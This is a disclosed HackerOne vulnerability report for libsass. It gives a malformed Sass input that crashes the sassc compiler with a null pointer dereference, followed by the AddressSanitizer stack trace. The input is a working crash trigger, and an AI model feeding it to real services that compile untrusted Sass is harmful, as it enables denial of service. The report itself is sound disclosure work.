# null pointer dereference in Sass::Eval::operator()(Sass::Map*)

## Report Details
- **Report ID**: 221287
- **URL**: https://hackerone.com/reports/221287
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-04-15T20:24:17.893Z
- **Disclosed**: 2017-06-08T19:09:04.418Z

## Reporter
- **Username**: geeknik
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: libsass

## Vulnerability Information
Feeding `@P#{(200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 0:0)}` to `./sassc -s` triggers this null pointer dereference.

```
==9885==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x000000952f5b bp 0x7fff7748a970 sp 0x7fff7748a720 T0)
    #0 0x952f5a in Sass::Eval::operator()(Sass::Map*) /home/geeknik/libsass/src/eval.cpp:525:31
    #1 0x951dff in Sass::Eval::operator()(Sass::List*) /home/geeknik/libsass/src/eval.cpp:490:14
    #2 0x951b36 in Sass::Eval::operator()(Sass::List*) /home/geeknik/libsass/src/eval.cpp:502:18
    #3 0x9a0042 in Sass::Eval::operator()(Sass::String_Schema*) /home/geeknik/libsass/src/eval.cpp:1236:27
    #4 0x9a0042 in Sass::Eval::operator()(Sass::String_Schema*) /home/geeknik/libsass/src/eval.cpp:1236:27
    #5 0x9cc301 in Sass::Expand::operator()(Sass::Directive*) /home/geeknik/libsass/src/expand.cpp:226:18
    #6 0x9f964c in Sass::Expand::append_block(Sass::Block*) /home/geeknik/libsass/src/expand.cpp:788:27
    #7 0x9c2379 in Sass::Expand::operator()(Sass::Block*) /home/geeknik/libsass/src/expand.cpp:81:5
    #8 0x656973 in Sass::Context::compile() /home/geeknik/libsass/src/context.cpp:658:12
    #9 0x64c56b in Sass::File_Context::parse() /home/geeknik/libsass/src/context.cpp:587:12
    #10 0x5d0650 in Sass::sass_parse_block(Sass_Compiler*) /home/geeknik/libsass/src/sass_context.cpp:227:22
    #11 0x5d0650 in sass_compiler_parse /home/geeknik/libsass/src/sass_context.cpp:476
    #12 0x5cf1d1 in sass_compile_context(Sass_Context*, Sass::Context*) /home/geeknik/libsass/src/sass_context.cpp:364:7
    #13 0x5cf6be in sass_compile_file_context /home/geeknik/libsass/src/sass_context.cpp:463:12
    #14 0x5b9d2e in compile_file /home/geeknik/sassc/sassc.c:145:5
    #15 0x5bab9b in main /home/geeknik/sassc/sassc.c:335:18
    #16 0x7f4edf974b44 in __libc_start_main /build/glibc-qK83Be/glibc-2.19/csu/libc-start.c:287
    #17 0x5b92fc in _start (/home/geeknik/sassc/bin/sassc+0x5b92fc)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /home/geeknik/libsass/src/eval.cpp:525 Sass::Eval::operator()(Sass::Map*)
==9885==ABORTING
```

## Attachments
No attachments
